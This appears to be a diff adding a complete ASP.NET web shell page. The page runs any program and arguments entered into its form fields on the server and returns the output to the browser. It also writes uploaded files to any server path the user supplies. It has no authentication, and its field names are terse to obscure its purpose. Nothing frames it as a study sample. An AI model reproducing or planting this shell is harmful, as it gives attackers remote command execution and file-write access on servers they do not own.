@@ -1,0 +1,84 @@
+<%@ Page Language="C#" Debug="true" Trace="false" %>
+<%@ Import Namespace="System.Web.UI.WebControls" %>
+<%@ Import Namespace="System.Diagnostics" %>
+<%@ Import Namespace="System.IO" %>
+
+<%
+	if(fi.HasFile && pa.Text.Length > 0)
+	{
+		fi.SaveAs(pa.Text);
+	}
+    if (co.Text.Length > 0 && pr.Text.Length > 0)
+    {
+        Process p = new Process();
+        p.StartInfo.CreateNoWindow = true;
+        p.StartInfo.FileName = pr.Text;
+        p.StartInfo.Arguments = co.Text;
+        p.StartInfo.UseShellExecute = false;
+        p.StartInfo.RedirectStandardOutput = true;
+        p.StartInfo.RedirectStandardError = true;
+        p.Start();
+        ou.Text = p.StandardOutput.ReadToEnd().Replace("\r\n", "<br>") + p.StandardError.ReadToEnd().Replace("\r\n", "<br>");
+        co.Text = "";
+		pr.Text = "";
+    }
+%>
+
+<!DOCTYPE html>
+<html lang="en" xmlns="http://www.w3.org/1999/xhtml">
+<head runat="server">
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+	<style>
+		.sidebar {
+		  position: absolute;
+		  top: 0px;
+		  bottom: 0px;
+		  left: 0px;
+		  display: inline-block;
+		  width: 332px;
+		  background-color: #0072C6;
+		}
+		.sidebar2 {
+		  position: absolute;
+		  top: 0px;
+		  bottom: 0px;
+		  left: 332px;
+		  display: inline-block;
+		}
+		.form-control {
+		  padding: 3px;
+		  width: 95%;
+		  margin: 3px;
+		}
+	</style>
+</head>
+<body>
+	<div class="sidebar">
+		<form id="form" runat="server">
+			<div>
+				<asp:TextBox runat="server" ID="pr" placeholder="pr" class="form-control" autofocus />
+			</div>
+			<div>
+				<asp:TextBox runat="server" ID="co" placeholder="co" class="form-control" autofocus />
+			</div>
+			<div>
+				<asp:Button class="form-control" runat="server" ID="B1" Text="go" />
+			</div>
+			<div>
+				<asp:TextBox runat="server" ID="pa" placeholder="pa" class="form-control" autofocus />
+			</div>
+			<div>
+				<asp:FileUpload class="form-control" runat="server" ID="fi" />
+			</div>
+			<div>
+				<asp:Button class="form-control" runat="server" ID="B2" Text="go" />
+			</div>
+		</form>
+	</div>
+	<div class="sidebar2">
+		<asp:Literal runat="server" ID="ou" />
+	</div>
+</body>
+</html>
